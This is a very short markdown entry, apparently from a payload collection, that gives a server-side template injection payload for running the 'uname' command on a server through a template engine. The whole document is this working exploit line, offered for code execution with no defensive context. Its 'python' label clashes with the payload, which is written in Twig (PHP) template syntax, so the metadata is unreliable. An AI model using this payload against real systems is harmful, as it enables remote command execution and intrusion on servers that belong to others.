---
exploit: template-injection
language: python
tags: python
---


We can use a simple command to get code execution:

```
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}
```